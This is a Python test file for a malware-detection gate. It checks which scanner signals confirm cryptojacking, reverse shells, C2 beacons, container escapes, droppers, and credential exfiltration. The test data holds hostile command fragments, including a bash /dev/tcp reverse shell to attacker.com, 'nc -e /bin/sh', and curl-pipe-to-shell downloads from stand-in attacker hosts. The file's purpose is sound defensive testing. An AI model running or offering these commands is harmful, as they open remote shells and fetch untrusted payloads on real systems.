"""Tests for the precision-first confirmation gate."""

from __future__ import annotations

from knorr.scanning.config_scan import ConfigSignal
from knorr.scanning.gate import confirm


def _sig(category: str, rule: str, evidence: str = "evidence") -> ConfigSignal:
    return ConfigSignal(category, rule, evidence)


# ---------------------------------------------------------------------------
# Tier-A: confirm alone
# ---------------------------------------------------------------------------

def test_confirm_cryptojacking_miner_plus_wallet():
    sigs = [
        _sig("cryptomining", "miner-binary", "xmrig"),
        _sig("cryptomining", "monero-wallet",
             "48edfhQ3xa1nBCqMrPnLT6j2Z99s2V8dq5Fak9AyS3ZVXDE3mxKzMhNZ"),
    ]
    ok, tier, confirming = confirm(sigs)
    assert ok is True
    assert tier == "A:cryptojacking"
    assert len(confirming) >= 2


def test_confirm_cryptojacking_wallet_flag():
    sigs = [
        _sig("cryptomining", "miner-binary", "xmrig"),
        _sig("cryptomining", "miner-wallet-flag", "--user=WALLETADDRESS"),
    ]
    ok, tier, _ = confirm(sigs)
    assert ok is True
    assert tier == "A:cryptojacking"


def test_confirm_cryptojacking_kill_competitors():
    sigs = [
        _sig("cryptomining", "miner-binary", "xmrig"),
        _sig("cryptomining", "kill-competitors", "pkill xmrig"),
    ]
    ok, tier, _ = confirm(sigs)
    assert ok is True
    assert tier == "A:cryptojacking"


def test_confirm_bash_tcp_revshell():
    sigs = [_sig("reverse_shell", "bash-tcp", "/dev/tcp/attacker.com/4444 0>&1")]
    ok, tier, confirming = confirm(sigs)
    assert ok is True
    assert "reverse_shell" in tier


def test_confirm_nc_exec():
    sigs = [_sig("reverse_shell", "nc-exec", "nc -e /bin/sh 10.0.0.1 4444")]
    ok, tier, _ = confirm(sigs)
    assert ok is True


def test_confirm_mkfifo_shell():
    sigs = [_sig("reverse_shell", "mkfifo-shell", "mkfifo /tmp/f | /bin/sh")]
    ok, tier, _ = confirm(sigs)
    assert ok is True


def test_confirm_python_revshell():
    sigs = [_sig("reverse_shell", "python-revshell", "pty.spawn('/bin/sh')")]
    ok, tier, _ = confirm(sigs)
    assert ok is True


def test_confirm_c2_framework():
    sigs = [_sig("c2", "c2-framework", "cobaltstrike beacon")]
    ok, tier, _ = confirm(sigs)
    assert ok is True
    assert "c2" in tier


def test_confirm_preload_rootkit():
    sigs = [_sig("reverse_shell", "preload-rootkit", "libprocesshider.so")]
    ok, tier, _ = confirm(sigs)
    assert ok is True


def test_confirm_cgroup_release_agent():
    sigs = [_sig("container_escape", "cgroup-release-agent", "/tmp/cgroup/release_agent")]
    ok, tier, _ = confirm(sigs)
    assert ok is True


def test_confirm_python_exec_decode():
    sigs = [_sig("obfuscation", "python-exec-decode", "exec(base64.b64decode(...))")]
    ok, tier, _ = confirm(sigs)
    assert ok is True


def test_confirm_obfuscation_fetch_decode_exec_suspicious_host():
    """fetch-decode-exec confirms only when the URL points at attacker infra."""
    sigs = [_sig("obfuscation", "fetch-decode-exec",
                 "curl http://evil.tk/stage2 | base64 -d | bash")]
    ok, tier, _ = confirm(sigs)
    assert ok is True
    assert "obfuscation" in tier


def test_no_confirm_fetch_decode_exec_reputable_host():
    """fetch-decode-exec must NOT confirm when fetching from a reputable CDN."""
    sigs = [_sig("obfuscation", "fetch-decode-exec",
                 "curl https://github.com/install.sh | base64 -d | bash")]
    ok, tier, _ = confirm(sigs)
    assert ok is False


def test_confirm_dropper_curl_pipe_attacker():
    """curl-pipe-shell confirms when the URL targets attacker infra."""
    sigs = [_sig("obfuscation", "curl-pipe-shell",
                 "curl http://192.168.100.55/mal.sh | sh")]
    ok, tier, _ = confirm(sigs)
    assert ok is True
    assert "dropper" in tier


def test_no_confirm_curl_pipe_legitimate_host():
    """curl-pipe-shell must NOT confirm when the host is reputable (e.g. get.docker.com)."""
    sigs = [_sig("obfuscation", "curl-pipe-shell",
                 "curl https://get.docker.com | sh")]
    ok, _, _ = confirm(sigs)
    assert ok is False


# ---------------------------------------------------------------------------
# Tier-A: SBOM hit
# ---------------------------------------------------------------------------

def test_confirm_sbom_hit():
    ok, tier, confirming = confirm([], sbom_hits=[{"ecosystem": "npm", "name": "evil-pkg"}])
    assert ok is True
    assert tier == "A:malicious-dependency"


# ---------------------------------------------------------------------------
# Tier-B: steal-and-send
# ---------------------------------------------------------------------------

def test_confirm_steal_and_send():
    sigs = [
        _sig("credential_access", "cloud-metadata", "169.254.169.254"),
        _sig("exfiltration", "discord-webhook", "https://discord.com/api/webhooks/123/abc"),
    ]
    ok, tier, confirming = confirm(sigs)
    assert ok is True
    assert tier == "B:steal-and-send"


def test_confirm_steal_send_ssh_keys():
    sigs = [
        _sig("credential_access", "ssh-keys", "id_rsa"),
        _sig("exfiltration", "telegram-bot", "https://api.telegram.org/bot123:TOKEN"),
    ]
    ok, tier, _ = confirm(sigs)
    assert ok is True
    assert "steal" in tier


# ---------------------------------------------------------------------------
# Tier-B: persistent-dropper
# ---------------------------------------------------------------------------

def test_confirm_persistent_dropper():
    sigs = [
        _sig("persistence", "cron-inject", "crontab"),
        _sig("obfuscation", "raw-ip-fetch", "curl http://10.0.0.1/mal.sh"),
    ]
    ok, tier, _ = confirm(sigs)
    assert ok is True
    assert "persistent" in tier


# ---------------------------------------------------------------------------
# Dual-use: NEVER confirms alone
# ---------------------------------------------------------------------------

def test_no_confirm_miner_binary_alone():
    """A lone miner binary is a legitimate tool and must not confirm."""
    sigs = [_sig("cryptomining", "miner-binary", "xmrig")]
    ok, _, _ = confirm(sigs)
    assert ok is False


def test_no_confirm_host_mount_alone():
    sigs = [_sig("container_escape", "host-mount", "/host:/host")]
    ok, _, _ = confirm(sigs)
    assert ok is False


def test_no_confirm_privileged_alone():
    sigs = [_sig("container_escape", "privileged", "--privileged")]
    ok, _, _ = confirm(sigs)
    assert ok is False


def test_no_confirm_discord_webhook_alone():
    """A Discord webhook alone (no credential access) does not confirm."""
    sigs = [_sig("exfiltration", "discord-webhook", "https://discord.com/api/webhooks/X/Y")]
    ok, _, _ = confirm(sigs)
    assert ok is False


def test_no_confirm_empty():
    ok, tier, confirming = confirm([])
    assert ok is False
    assert tier is None
    assert confirming == []


def test_no_confirm_clean_image():
    sigs = [_sig("recon", "nmap-scan", "nmap -sV")]
    ok, _, _ = confirm(sigs)
    assert ok is False
